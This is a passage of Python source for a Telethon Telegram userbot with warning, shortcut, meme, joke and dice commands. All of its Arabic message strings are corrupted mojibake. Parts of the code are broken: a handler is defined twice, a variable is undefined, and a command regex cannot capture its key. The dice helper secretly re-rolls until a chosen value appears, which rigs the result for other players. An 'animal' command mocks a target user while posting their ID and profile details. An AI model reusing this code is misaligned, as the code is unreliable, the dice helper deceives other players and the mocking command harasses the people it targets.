    await event.reply(f"**‚éô ÿπÿØÿØ ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ŸÉ: {warnings}/{max_warnings}**")

@client.on(events.NewMessage(pattern=r"^.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±$"))
async def enable_warnings(event):
    if not event.is_private:
        return
    data["warnings_enabled"] = True
    save_data()
    await event.edit("**‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™.**")

@client.on(events.NewMessage(pattern=r"^.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±$"))
async def disable_warnings(event):
    if not event.is_private:
        return
    data["warnings_enabled"] = False
    save_data()
    await event.edit("**‚éô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™.**")

shortcuts = {}

@client.on(events.NewMessage(pattern=r"^.ÿßÿÆÿ™ÿµÿßÿ± \+ (\S+)$"))
async def add_shortcut(event):
    key = event.pattern_match.group(1)
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        shortcuts[key] = reply_message.text
        await event.edit(f"**‚éô ÿ™ŸÖ ÿ≠ŸÅÿ∏ ÿßŸÑÿßÿÆÿ™ÿµÿßÿ± ({key}) ‚á® {reply_message.text}**")
    else:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿÆÿ™ÿµÿßÿ±Ÿáÿß.**")

@client.on(events.NewMessage)
async def get_shortcut(event):
    text = event.raw_text.strip()
    if text in shortcuts:
        # ÿ™ÿ£ŸÉÿØ ÿ£ŸÜŸÉ ÿ£ŸÜÿ™ ŸÖŸÜ ÿ£ÿ±ÿ≥ŸÑÿ™ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©
        if event.out:
            await event.edit(shortcuts[text])

@client.on(events.NewMessage(pattern=r"^.ÿ≠ÿ∞ŸÅ ÿßÿÆÿ™ÿµÿßÿ± \+ (\S+)$"))
async def delete_shortcut(event):
    key = event.pattern_match.group(1)
    if key in shortcuts:
        del shortcuts[key]
        await event.edit(f"**‚éô ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿßÿÆÿ™ÿµÿßÿ± ({key})**")
    else:
        await event.edit(f"**‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ÿßÿÆÿ™ÿµÿßÿ± ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ ({key})**")

@client.on(events.NewMessage(pattern=r"^.ÿßŸÑÿßÿÆÿ™ÿµÿßÿ±ÿßÿ™$"))
async def list_shortcuts(event):
    if shortcuts:
        text = "\n".join([f"{k} ‚á® {v}" for k, v in shortcuts.items()])
        await event.edit(f"**‚éô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑÿßÿÆÿ™ÿµÿßÿ±ÿßÿ™:\n{text}**")
    else:
        await event.edit("**‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿßÿÆÿ™ÿµÿßÿ±ÿßÿ™ ŸÖÿ≠ŸÅŸàÿ∏ÿ©.**")
        

MEMES_DB = {}

@client.on(events.NewMessage(pattern=r"^\.ŸÖŸäŸÖÿ≤ (\S+) (.+)"))
async def add_meme(event):
    key = event.pattern_match.group(1)  
    url = event.pattern_match.group(2)  
    
    
    MEMES_DB[key] = url
    
    await event.edit(f"**·ØΩÔ∏ô ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ®ÿµŸÖÿ© '{key}' ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")


@client.on(events.NewMessage(pattern=r"^\Ÿ†/()(\S+)"))
async def get_meme(event):
    key = event.pattern_match.group(1)  
    
    if key in MEMES_DB:
        url = MEMES_DB[key]

        
        file_path = await download_telegram_audio(event.client, url)
        
        if file_path:
            await event.client.send_file(event.chat_id, file_path, voice_note=True)
            os.remove(file_path)  
        else:
            await event.reply("**‚ùå ŸÅÿ¥ŸÑ ŸÅŸä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ÿµŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ©!**")
    else:
        await event.reply(f"**‚ùå ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ®ÿµŸÖÿ© ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ '{key}'**")


@client.on(events.NewMessage(pattern=r"^.ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖŸäŸÖÿ≤$"))
async def list_memes(event):
    if MEMES_DB:
        message = "**·ØΩÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿ™ÿÆÿ≤ŸäŸÜ ÿ£ŸàÿßŸÖÿ± ÿßŸÑŸÖŸäŸÖÿ≤:**\n"
        for key in MEMES_DB:
            message += f"- ÿßŸÑÿ®ÿµŸÖÿ©: `{key}`\n"
    else:
        message = "**·ØΩÔ∏ô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿ®ÿµŸÖÿßÿ™ ŸÖŸäŸÖÿ≤ ŸÖÿÆÿ≤ŸÜÿ© ÿ≠ÿ™Ÿâ ÿßŸÑÿ¢ŸÜ**"
    
    await event.edit(message)


@client.on(events.NewMessage(pattern=r"^ÿßÿ≤ÿßŸÑÿ©(?:\s|$)([\s\S]*)"))
async def delete_meme(event):
    key = event.pattern_match.group(1)
    
    if key in MEMES_DB:
        del MEMES_DB[key]
        await event.edit(f"**·ØΩÔ∏ô ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ®ÿµŸÖÿ© '{key}' ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")
    else:
        await event.edit(f"**‚ùå ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ®ÿµŸÖÿ© ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ '{key}'**")


@client.on(events.NewMessage(pattern=r"^.ÿßÿ≤ÿßŸÑÿ©_ÿßŸÑÿ®ÿµŸÖÿßÿ™$"))
async def delete_all_memes(event):
    MEMES_DB.clear()
    await event.edit("**·ØΩÔ∏ô ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿ¨ŸÖŸäÿπ ÿ®ÿµŸÖÿßÿ™ ÿßŸÑŸÖŸäŸÖÿ≤ ŸÖŸÜ ÿßŸÑŸÇÿßÿ¶ŸÖÿ© ‚úì**")


async def download_telegram_audio(client, url):
    try:

        message = await client.get_messages(url, limit=1)
        if message and message.media:
            file_path = await client.download_media(message.media, file="voice_note.ogg")
            return file_path
        else:
            return None
    except Exception as e:
        print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ÿµŸÖÿ© ÿßŸÑÿµŸàÿ™Ÿäÿ©: {e}")
        return None

def get_clickable_name(user):
    name = user.first_name
    if user.username:
        return f"[{name}](https://t.me/{user.username})"
    return f"[{name}](tg://user?id={user.id})"


@client.on(events.NewMessage(pattern=r"\.(ŸÜÿ≥ÿ®ÿ©|ŸÜÿ≥ÿ®ÿ™ŸÜÿß) (.+)"))
async def percentage(event):
    word = event.pattern_match.group(2)
    percentage = random.randint(1, 100)

    if event.is_reply:
        user = await event.get_reply_message()
        target_name = get_clickable_name(user.sender)
    else:
        target_name = get_clickable_name(event.sender)

    await event.edit(f"**‚éô {word} ŸÑÿØŸâ {target_name}: {percentage}%**", parse_mode="md")


@client.on(events.NewMessage(pattern=r"\.(ÿ®Ÿàÿ≥ÿ©|ŸáŸäŸÜÿ©)"))
async def kiss(event):
    actions = ["ŸáÿßŸÉ ÿ®Ÿàÿ≥Ÿá", "ÿ®Ÿàÿ≥ÿ© ÿÆŸÅŸäŸÅÿ©", "ÿ®Ÿàÿ≥ÿ© ÿπŸÑŸâ ÿßŸÑÿ¨ÿ®ŸäŸÜ", "ÿ®Ÿàÿ≥ÿ© ŸÖÿπ ÿ≠ÿ∂ŸÜ"]
    
    if event.is_reply:
        user = await event.get_reply_message()
        target_name = get_clickable_name(user.sender)
    else:
        target_name = get_clickable_name(event.sender)

    await event.edit(f"{target_name}, {random.choice(actions)}", parse_mode="md")


user_titles = {}  

@client.on(events.NewMessage(pattern=r"\ÿ±ŸÅÿπ (.+)"))
async def promote(event):
    title = event.pattern_match.group(1)

    if event.is_reply:
        user = await event.get_reply_message()
        user_id = user.sender_id
        user_name = get_clickable_name(user.sender)
    else:
        user_id = event.sender_id
        user_name = get_clickable_name(event.sender)

    if user_id not in user_titles:
        user_titles[user_id] = []

    if title in user_titles[user_id]:
        return await event.edit(f"**‚éô Ÿáÿ∞ÿß ŸÖÿ±ŸÅŸàÿπ {title} ŸÖŸÜ ÿßŸàŸÑ**", parse_mode="md")

    user_titles[user_id].append(title)
    await event.edit(f"**‚éô ÿ™ŸÖ ÿ±ŸÅÿπ {user_name} ÿ•ŸÑŸâ {title}**", parse_mode="md")

OWNER_ID = 6383191007  # ÿ∂ÿπ ŸáŸÜÿß ŸÖÿπÿ±ŸÅ ÿßŸÑŸÖÿßŸÑŸÉ ÿßŸÑÿ≠ŸÇŸäŸÇŸä

user_titles = {}  

@client.on(events.NewMessage(pattern=r"\..ÿ±ŸÅÿπ (.+)"))
async def promote(event):
    # ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿ£ŸÜ ÿßŸÑŸÖÿ±ÿ≥ŸÑ ŸáŸà ÿßŸÑŸÖÿßŸÑŸÉ ŸÅŸÇÿ∑
    if event.sender_id != OWNER_ID:
        return await event.reply("**‚éô Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ŸÖÿÆÿµÿµ ŸÑŸÑŸÖÿßŸÑŸÉ ŸÅŸÇÿ∑**", parse_mode="md")

    title = event.pattern_match.group(1)

    if event.is_reply:
        user = await event.get_reply_message()
        user_id = user.sender_id
        user_name = get_clickable_name(user.sender)
    else:
        user_id = event.sender_id
        user_name = get_clickable_name(event.sender)

    if user_id not in user_titles:
        user_titles[user_id] = []

    if title in user_titles[user_id]:
        return await event.reply(f"**‚éô Ÿáÿ∞ÿß ŸÖÿ±ŸÅŸàÿπ {title} ŸÖŸÜ ÿßŸàŸÑ**", parse_mode="md")

    user_titles[user_id].append(title)
    await event.reply(f"**‚éô ÿ™ŸÖ ÿ±ŸÅÿπ {user_name} ÿ•ŸÑŸâ {title}**", parse_mode="md")

@client.on(events.NewMessage(pattern=r"\.ÿ≤Ÿàÿßÿ¨"))
async def marriage(event):
    responses = ["üíç ÿ£ŸÑŸÅ ŸÖÿ®ÿ±ŸàŸÉ ÿßŸÑÿ≤Ÿàÿßÿ¨!", "ÿ™ŸÖ ÿßŸÑÿ≤Ÿàÿßÿ¨ ÿ±ÿ≥ŸÖŸäŸãÿß!", "ÿßŸÑÿ≤Ÿàÿßÿ¨ ŸÖÿ±ŸÅŸàÿ∂!", "ÿ£ÿ¨ŸÖŸÑ ÿ´ŸÜÿßÿ¶Ÿä!"]
    await event.reply(random.choice(responses))


@client.on(events.NewMessage(pattern=r"\.ŸÖŸÇÿßÿ±ŸÜÿ©"))
async def compare(event):
    percentage = random.randint(1, 100)
    await event.edit(f"**ŸÜÿ≥Ÿäÿ© ÿßŸÑŸÖŸÇÿßÿ±ŸÜŸá {percentage}% ÿ®ŸäŸÜŸÉŸÖÿß**")


@client.on(events.NewMessage(pattern=r"\.ÿßŸÇÿ™ŸÑŸá"))
async def kill(event):
    methods = ["ÿ™ŸÖ ÿßŸÑÿ∑ÿπŸÜ ÿ≠ÿ™Ÿâ ÿßŸÑŸÖŸàÿ™", "ÿßŸÜŸÅÿ¨ÿ± ŸÅŸä ÿßŸÑŸáŸàÿßÿ°", "ÿ£Ÿèÿ∑ŸÑŸÇ ÿπŸÑŸäŸá ÿßŸÑŸÜÿßÿ±", "ÿ≥ŸÇÿ∑ ŸÖŸÜ ŸÖÿ®ŸÜŸâ ÿ¥ÿßŸáŸÇ"]

    if event.is_reply:
        user = await event.get_reply_message()
        target_name = get_clickable_name(user.sender)
    else:
        target_name = get_clickable_name(event.sender)

    await event.edit(f"{target_name} {random.choice(methods)}", parse_mode="md")

target_user_id = 6383191007  

last_reply_times = {}

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def handler(event):
    global last_reply_times
    sender_id = event.sender_id
    current_time = time.time()


    if sender_id == target_user_id:
        
        if sender_id not in last_reply_times or current_time - last_reply_times[sender_id] > 7200:
            await event.reply("ŸáŸÑÿß ŸÖÿ∑Ÿàÿ±Ÿä")
            last_reply_times[sender_id] = current_time

plugin_category = "ÿßŸÑÿπÿ±Ÿàÿ∂"

sts_animal_list = [
    "https://telegra.ph/file/720a8d292301289bb7ca4.mp4",  # ŸÖÿ∑Ÿä
    "https://telegra.ph/file/fa43723297d16ebccfa94.mp4",  # ŸÉŸÑÿ®
    "https://telegra.ph/file/bc4c35ca805ab9e4ef8d7.mp4",  # ŸÇÿ±ÿØ
    "https://telegra.ph/file/7cc42816b3e161f7183b6.mp4",  # ÿµÿÆŸÑ
    "https://telegra.ph/file/8beaf555e0d4e3f00c294.mp4",  # ÿ∑ŸÑŸä
    "https://telegra.ph/file/c34cb870037a4ed2be972.mp4",  # ÿ®ÿ≤ŸàŸÜ
    "https://telegra.ph/file/c499feb6a51dea16a1fe5.mp4",  # ÿßÿ®Ÿà ÿ®ÿ±Ÿäÿµ
    "https://telegra.ph/file/19b193f06d680e3ec79c0.mp4",  # ÿ¨ÿ±Ÿäÿ∞Ÿä
    "https://telegra.ph/file/cd1fcb86af78d83ba9002.mp4",  # ŸáÿßŸäÿ¥Ÿá
]

jjj = [
    "100% ŸÖŸà ÿ≠ŸäŸàÿßŸÜ ÿ∫ŸÜÿ®ŸÑŸá üò±üòÇ.",
    "90% ŸÖŸà ÿ≠ŸäŸàÿßŸÜ ÿ∂ŸäŸÖ üò±üòÇüëÜ",
    "80%  Ÿ¥üò±üòÇ",
    "70%  Ÿ¥üò±üòÇ",
    "60% ÿ®ÿ±ÿßÿ≥Ÿá 60 ÿ≠ÿ∏ üëåüòÇ",
    "50% ÿ≠ŸäŸàÿßŸÜ Ÿáÿ¨ŸäŸÜüëçüòÇ",
    "( 40% ) ÿÆŸàÿ¥ ÿ≠ŸäŸàÿßŸÜ üëåüòÇ",
    "30% Ÿ¥üòíüòÇ",
    "20% Ÿ¥üòíüòÇ",
    "10% Ÿ¥üòíüòÇ",
    "0% Ÿ¥üò¢üòÇ",
]


async def get_user_from_event(event):
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        return await event.client.get_entity(previous_message.sender_id)
    else:
        user = event.pattern_match.group(1)
        if user.isnumeric():
            user = int(user)
        if not user:
            self_user = await event.client.get_me()
            user = self_user.id
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                return await event.client.get_entity(probable_user_mention_entity.user_id)
        if isinstance(user, int) or user.startswith("@"):
            return await event.client.get_entity(user)
        try:
            return await event.client.get_entity(user)
        except (TypeError, ValueError) as err:
            await event.edit(str(err))
            return None


async def fetch_info(replied_user, event):
    full_user = (await event.client(GetFullUserRequest(replied_user.id))).full_user
    replied_user_profile_photos = await event.client(
        GetUserPhotosRequest(user_id=replied_user.id, offset=42, max_id=0, limit=80)
    )
    replied_user_profile_photos_count = "ÿßŸÑÿ≠ŸäŸàÿßŸÜ ŸÖÿßŸÖÿÆŸÑŸä ÿ®ÿ±ŸàŸÅÿßŸäŸÑ"
    try:
        replied_user_profile_photos_count = replied_user_profile_photos.count
    except AttributeError:
        pass

    user_id = replied_user.id
    first_name = replied_user.first_name or "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"
    last_name = replied_user.last_name or ""
    username = f"@{replied_user.username}" if replied_user.username else "ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿπÿ±ŸÅ"
    yoy = random.choice(jjj)
    x = random.randint(0, len(sts_animal_list) - 1)

    animal_types = [
        "ŸÖÿ∑Ÿä ÿ≤ÿ±ÿ®Ÿá ü¶ì", "ÿ¨ŸÑÿ® ÿ¥Ÿàÿßÿ±ÿπ üêï‚Äçü¶∫", "ŸÇÿ±ÿØ ŸÑÿ≤ŸÉŸÄŸá üêí", "ÿµÿÆŸÑ ŸÖÿ≠ÿ™ÿ±ŸÖ üêê",
        "ÿ∑ŸÑŸä ÿßÿ®Ÿà ÿßŸÑÿ®ÿπÿ±Ÿàÿ± ÿßŸÑŸàÿµÿÆ üêë", "ÿ®ÿ≤ŸàŸÜ ÿßÿ®ŸàÿÆÿßŸÑÿØ üêà", "ÿßŸÑÿ≤ÿßÿ≠ŸÅ ÿßÿ®Ÿà ÿ®ÿ±Ÿäÿµ ü¶é",
        "ÿ¨ÿ±Ÿäÿ∞Ÿä ÿßÿ®Ÿà ÿßŸÑŸÖÿ¨ÿßÿ±Ÿä üêÄ", "ŸáÿßŸäÿ¥Ÿá üêÑ"
    ]

    caption = (
        f"<b>  ‚ïÆ‚Ä¢ü¶¶ ÿßŸÑÿ≠ŸäŸàÿßŸÜ ‚á¶ </b> {first_name} {last_name} \n"
        f"<b> Ÿ¥‚ïº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïæ </b>\n"
        f"<b> ‚Ä¢ ‚éô | ŸÖÿπŸÄÿ±ŸÅŸá  ‚á¶ </b> {username}\n"
        f"<b> ‚Ä¢ ‚éô | ÿßŸäŸÄÿØŸäŸá   ‚á¶ </b> <code>{user_id}</code>\n"
        f"<b> ‚Ä¢ ‚éô | ÿµŸÄŸàÿ±Ÿá  ‚á¶ </b> {replied_user_profile_photos_count} </b>\n"
        f"<b> ‚Ä¢ ‚éô | ŸÜŸÄŸÄŸàÿπŸá   ‚á¶  {animal_types[x]} </b>\n"
        f"<b> ‚Ä¢ ‚éô | ŸÜÿ≥ÿ®ÿ™ŸÄŸá  ‚á¶  {yoy} </b>\n\n\n"
    )

    return sts_animal_list[x], caption

@client.on(events.NewMessage(pattern=r"^.ÿ≠ŸäŸàÿßŸÜ(?: |$)(.*)"))
async def who(event):
    zed = await event.edit("‚áÜ") 
    zel_dev = {6383191007}
    special_users = {6383191007}

    if not os.path.isdir("downloads"):
        os.makedirs("downloads")

    replied_user = await get_user_from_event(event)
    if not replied_user:
        return await event.edit("**- ŸÑŸÄŸÖ ÿßÿ≥ÿ™ÿ∑ŸÄÿπ ÿßŸÑÿπÿ´ŸÄŸÄŸàÿ± ÿπŸÑŸâ ÿßŸÑÿ¥ÿÆÿµ**")

    if replied_user.id in zel_dev:
        return await event.edit("**- ÿØŸä . . ÿ•ŸÜŸáŸè ÿ£ÿ≠ÿØ ÿßŸÑŸÖÿ∑Ÿàÿ±ŸäŸÜ . . ÿßŸÜÿ™Ÿé ÿßŸÑÿ≠ŸäŸàÿßŸÜ ŸàŸÑŸÉ**")

    if replied_user.id in special_users:
        return await event.edit("**- ÿØŸä . . ÿ•ŸÜŸáŸè ÿßŸÑŸÖÿ∑Ÿàÿ± . . ÿßŸÜÿ™Ÿé ÿßŸÑÿ≠ŸäŸàÿßŸÜ ŸàŸÑŸÉ**")

    try:
        ZEED_IMG, caption = await fetch_info(replied_user, event)
    except AttributeError:
        return await event.edit("**- ŸÑŸÄŸÖ ÿßÿ≥ÿ™ÿ∑ŸÄÿπ ÿßŸÑÿπÿ´ŸÄŸÄŸàÿ± ÿπŸÑŸâ ÿßŸÑÿ¥ÿÆÿµ**")

    message_id_to_reply = event.message.reply_to_msg_id or None

    try:
        if ZEED_IMG: 
            await event.client.send_file(
                event.chat_id,
                ZEED_IMG,
                caption=caption,
                link_preview=False,
                reply_to=message_id_to_reply,
                parse_mode="html",
            )
            await zed.delete()
        else:
            await event.edit(caption, parse_mode="html")
    except Exception as e:
        await event.edit(f"**- ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£:** {str(e)}")

DART_E_MOJI = "üéØ"
DICE_E_MOJI = "üé≤"
BALL_E_MOJI = "üèÄ"
FOOT_E_MOJI = "‚öΩÔ∏è"
SLOT_E_MOJI = "üé∞"

async def roll_dice(event, emoticon, max_value):
    reply_message = event
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
    
    input_str = event.pattern_match.group(2)
    await event.delete()
    
    r = await reply_message.reply(file=InputMediaDice(emoticon=emoticon))
    
    if input_str:
        try:
            required_number = int(input_str)
            while True:
                
                if r.media.value == required_number:
                    break
                await r.delete()
                r = await reply_message.reply(file=InputMediaDice(emoticon=emoticon))
        except Exception:
            pass
    else:
        if event.sender_id == (await event.client.get_me()).id:
            await event.edit(file=InputMediaDice(emoticon=emoticon))
        else:
            await event.reply(file=InputMediaDice(emoticon=emoticon))


DART_E_MOJI = "üéØ"
DICE_E_MOJI = "üé≤"
BALL_E_MOJI = "üèÄ"
FOOT_E_MOJI = "‚öΩÔ∏è"
SLOT_E_MOJI = "üé∞"

@client.on(events.NewMessage(pattern=".ÿßŸÉÿ≥ ÿßŸà$"))
async def gamex(event):
    noob = "play"
    await tap[0].click(event.chat_id)
    await event.delete()

@client.on(events.NewMessage(pattern=f"({DART_E_MOJI}|.ÿ≥ŸáŸÖ)( ([1-6])|$)"))
async def dart_game(event):
    emoticon = "üéØ" if event.pattern_match.group(1) == ".ÿ≥ŸáŸÖ" else DART_E_MOJI
    await roll_dice(event, emoticon, 6)

@client.on(events.NewMessage(pattern=f"({DICE_E_MOJI}|.ŸÜÿ±ÿØ)( ([1-6])|$)"))
async def dice_game(event):
    emoticon = "üé≤" if event.pattern_match.group(1) == ".ŸÜÿ±ÿØ" else DICE_E_MOJI
    await roll_dice(event, emoticon, 6)

@client.on(events.NewMessage(pattern=f"({BALL_E_MOJI}|.ÿ≥ŸÑŸá)( ([1-5])|$)"))
async def basketball_game(event):
    emoticon = "üèÄ" if event.pattern_match.group(1) == ".ÿ≥ŸÑŸá" else BALL_E_MOJI
    await roll_dice(event, emoticon, 5)

@client.on(events.NewMessage(pattern=f"({FOOT_E_MOJI}|.ŸÉÿ±ÿ©)( ([1-5])|$)"))
async def football_game(event):
    emoticon = "‚öΩÔ∏è" if event.pattern_match.group(1) == ".ŸÉÿ±ÿ©" else FOOT_E_MOJI
    await roll_dice(event, emoticon, 5)

@client.on(events.NewMessage(pattern=f"({SLOT_E_MOJI}|.ÿ≠ÿ∏)( ([1-64])|$)"))
async def slot_game(event):
    emoticon = "üé∞" if event.pattern_match.group(1) == ".ÿ≠ÿ∏" else SLOT_E_MOJI
    await roll_dice(event, emoticon, 64)


async def amongus_gen(text: str, clr: int) -> str:
    url = "https://github.com/JoKeRUB-AR/l313l-Resources/raw/master/Resources/Amongus/"
    font = ImageFont.truetype(
        BytesIO(
            get(
                "https://github.com/JoKeRUB-AR/l313l-Resources/raw/master/Resources/fonts/bold.ttf"
            ).content
        ),
        60,
    )
    imposter = Image.open(BytesIO(get(f"{url}{clr}.png").content))
    text_ = "\n".join("\n".join(wrap(part, 30)) for part in text.split("\n"))
    w, h = ImageDraw.Draw(Image.new("RGB", (1, 1))).multiline_textsize(
        text_, font, stroke_width=2
    )
    text = Image.new("RGBA", (w + 30, h + 30))
    ImageDraw.Draw(text).multiline_text(
        (15, 15), text_, "#FFF", font, stroke_width=2, stroke_fill="#000"
    )
    w = imposter.width + text.width + 10
    h = max(imposter.height, text.height)
    image = Image.new("RGBA", (w, h))
    image.paste(imposter, (0, h - imposter.height), imposter)
    image.paste(text, (w - text.width, 0), text)
    image.thumbnail((512, 512))
    output = BytesIO()
    output.name = "imposter.webp"
    webp_file = os.path.join('TEMP_DIR', output.name)
    image.save(webp_file, "WebP")
    return webp_file


@client.on(events.NewMessage(pattern=r'.ŸÖŸÜ ÿßŸÑŸÇÿßÿ™ŸÑ(|ÿ®ÿ±Ÿäÿ°) ([\s\S]*)'))
async def imposter_handler(event):
    name = event.pattern_match.group(2)
    cmd = event.pattern_match.group(1).lower()
    
    text1 = await event.reply("·ØΩÔ∏ô ŸáŸÖŸÖŸÖ ÿßŸÉŸäŸÄÿØ ÿßŸÉŸà ÿ¥ŸÄÿÆÿµ ŸÖÿßÿ™ !!")
    await asyncio.sleep(2)
    await text1.delete()
    
    if cmd == "ÿ®ÿ±Ÿäÿ°":
        await event.reply(f"**{name} ŸÑŸÄŸÖ ŸäŸÄŸÉŸÜ ÿßŸÑŸÄŸÇÿßÿ™ŸÑ.**")
    else:
        await event.reply(f"**{name} ŸÑŸÇŸÄÿØ ŸÉŸÄÿßŸÜ ÿßŸÑŸÄŸÇÿßÿ™ŸÑ.**")


@client.on(events.NewMessage(pattern=r'.ÿßŸÑŸÇÿßÿ™ŸÑ(|ÿ®ÿ±Ÿäÿ°) ([\s\S]*)'))
async def text_animation_handler(event):
    name = event.pattern_match.group(2)
    cmd = event.pattern_match.group(1).lower()

    catevent = await event.reply(f"{name} ÿ™ŸÄŸÖ ÿßÿÆŸÄÿ±ÿßÿ¨ŸÄŸá.......")
    await asyncio.sleep(2)
    await catevent.edit("‡∂û„Ö§„Ö§„Ö§„Ö§ „Ö§„Ö§„Ö§„Ö§")
    await asyncio.sleep(0.8)

    if cmd == "":
        await catevent.edit(f"{name} ŸÑŸÇŸÄÿØ ŸÉŸÄÿßŸÜ ÿßŸÑŸÄŸÇÿßÿ™ŸÑ.")
    elif cmd == "ÿ®ÿ±Ÿäÿ°":
        await catevent.edit(f"{name} ŸÑŸÄŸÖ ŸäŸÄŸÉŸÜ ÿßŸÑŸÄŸÇÿßÿ™ŸÑ.")
        

@client.on(events.NewMessage(pattern=r"^.ÿßÿ¥Ÿáÿ± ŸÖÿ≤ÿ∫ÿ±ŸÅÿ©$"))
async def ÿßÿ¥Ÿáÿ±_ŸÖÿ≤ÿ∫ÿ±ŸÅÿ©(event):
    await event.edit(
        "**‚ú¶ ÿßÿ¥Ÿáÿ± ŸÖÿ≤ÿÆÿ±ŸÅÿ© ‚ú¶**\n\n"
        "‚ú¶ ÿßŸÑÿ£ÿ¥Ÿáÿ± ÿßŸÑŸÖŸäŸÑÿßÿØŸäÿ© ‚ú¶\n"
        "- ùë±ùíÇùíèùíñùíÇùíìùíö ‚úø\n"
        "- ùë≠ùíÜùíÉùíìùíñùíÇùíìùíö ‚ù•\n"
        "- ùë¥ùíÇùíìùíÑùíâ ‚ôõ\n"
        "- ùë®ùíëùíìùíäùíç ‚ô°\n"
        "- ùë¥ùíÇùíö ñ•î\n"
        "- ùë±ùíñùíèùíÜ ‚ú∫\n"
        "- ùë±ùíñùíçùíö ‚ùÄ\n"
        "- ùë®ùíñùíàùíñùíîùíï Í®Ñ\n"
        "- ùë∫ùíÜùíëùíïùíÜùíéùíÉùíÜùíì ‚òΩ\n"
        "- ùë∂ùíÑùíïùíêùíÉùíÜùíì ‚ú¶\n"
        "- ùëµùíêùíóùíÜùíéùíÉùíÜùíì ‚ùÅ\n"
        "- ùë´ùíÜùíÑùíÜùíéùíÉùíÜùíì ‚åØ\n"
        "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n"
        "‚ú¶ ÿßŸÑÿ£ÿ¥Ÿáÿ± ÿßŸÑŸáÿ¨ÿ±Ÿäÿ© ‚ú¶\n"
        "- ŸÖŸèÿ≠Ÿéÿ±ŸéŸëŸÖ ‚õß\n"
        "- ÿµŸéŸÅŸéÿ± ‚ù¶\n"
        "- ÿ±Ÿéÿ®ŸêŸäÿπ Ÿ±ŸÑŸíÿ£ŸéŸàŸéŸëŸÑ ‚ú•\n"
        "- ÿ±Ÿéÿ®ŸêŸäÿπ Ÿ±ŸÑÿ´ŸéŸëÿßŸÜŸêŸä ‚úø\n"
        "- ÿ¨ŸèŸÖŸéÿßÿØŸéŸâ Ÿ±ŸÑŸíÿ£ŸèŸàŸÑŸéŸâ ‚òæ\n"
        "- ÿ¨ŸèŸÖŸéÿßÿØŸéŸâ Ÿ±ŸÑÿ´ŸéŸëÿßŸÜŸêŸäŸéÿ© ‚ù£Ô∏è\n"
        "- ÿ±Ÿéÿ¨Ÿéÿ® ìÜ©‚∏ôìÜ™\n"
        "- ÿ¥ŸéÿπŸíÿ®ŸéÿßŸÜ ‚úø\n"
        "- ÿ±ŸéŸÖŸéÿ∂ŸéÿßŸÜ ‚õß\n"
        "- ÿ¥ŸéŸàŸéŸëÿßŸÑ ‚òΩ\n"
        "- ÿ∞ŸèŸà Ÿ±ŸÑŸíŸÇŸéÿπŸíÿØŸéÿ© ‚ùÅ\n"
        "- ÿ∞ŸèŸà Ÿ±ŸÑŸíÿ≠Ÿêÿ¨ŸéŸëÿ© ‚úß\n"
        "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n"
        "‚ú¶ ÿ£ŸäÿßŸÖ ÿßŸÑÿ£ÿ≥ÿ®Ÿàÿπ ‚ú¶\n"
        "- ùì¢ùìæùì∑ùì≠ùì™ùîÇ ‚úø\n"
        "- ùìúùì∏ùì∑ùì≠ùì™ùîÇ ‚õß\n"
